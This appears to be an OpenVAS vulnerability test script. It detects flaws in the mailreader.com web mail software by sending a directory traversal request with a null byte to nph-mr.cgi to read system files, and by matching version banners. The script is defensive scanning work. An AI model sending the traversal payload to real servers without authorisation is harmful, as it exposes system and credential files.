###############################################################################
# OpenVAS Vulnerability Test
# $Id: mailreader.nasl 12008 2018-10-22 08:12:11Z cfischer $
#
# mailreader.com directory traversal and arbitrary command execution
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
# Date: Mon, 28 Oct 2002 17:48:04 +0800
# From: "pokleyzz" <pokleyzz@scan-associates.net>
# To: "bugtraq" <bugtraq@securityfocus.com>,
#  "Shaharil Abdul Malek" <shaharil@scan-associates.net>,
#  "sk" <sk@scan-associates.net>, "pokley" <saleh@scan-associates.net>,
#  "Md Nazri Ahmad" <nazri@ns1.scan-associates.net>
# Subject: SCAN Associates Advisory : Multiple vurnerabilities on mailreader.com

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11780");
  script_version("$Revision: 12008 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 10:12:11 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("mailreader.com directory traversal and arbitrary command execution");
  script_category(ACT_ATTACK);
  script_copyright("(C) Michel Arboi 2003");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to v2.3.32 or later.");

  script_tag(name:"summary", value:"mailreader.com software is installed. A directory traversal flaw
  allows anybody to read arbitrary files on your system.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

dirtrav = 1; version = 1;

files = traversal_files();

vtstring = get_vt_string();

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  r2 = NULL;
  if (dirtrav)
  {
    foreach pattern(keys(files)) {

      file = files[pattern];

      url = strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../" + file + "%00");
      r = http_get(port: port, item: url);
      r2 =  http_keepalive_send_recv(port: port, data: r);
      if (isnull(r2)) exit(0);	# Dead server
      if (egrep(string: r2, pattern: pattern))
      {
        report = report_vuln_url(url: url);
        security_message(data: report, port: port);
        dirtrav = 0;
      }
    }
  }

  if (version)
  {
    if (r2 !~ "Powered by Mailreader.com v[0-9.]*")
    {
      r = http_get(port: port, item: strcat(dir,  "/nph-mr.cgi?do=loginhelp&configLanguage=english"));
      r2 =  http_keepalive_send_recv(port: port, data: r);
    }
    if (r2 =~ "Powered by Mailreader.com v2\.3\.3[01]")
    {
      m = "You are running a version of mailreader.com software
which allows any authenticated user to run arbitrary commands
on your system.

*** Note that " + vtstring + " just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later";
      security_message(port: port, data: m);
      version = 0;
    }
    else if (r2 =~ "Powered by Mailreader.com v2\.([0-1]\.*|2\.([0-2]\..*|3\.([0-9][^0-9]|[12][0-9])))")
    {
# Note: SecurityFocus #5393 advises you to upgrade to 2.3.30, but
# this version contains a terrible flaw! (read above)
      m = "You are running an old version of mailreader.com software
which allows an attacker to hijack user session.

*** Note that " + vtstring + " just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later";
      security_message(port: port, data: m);
      version = 0;
    }
  }
  if (! version && ! dirtrav) exit(0);
}

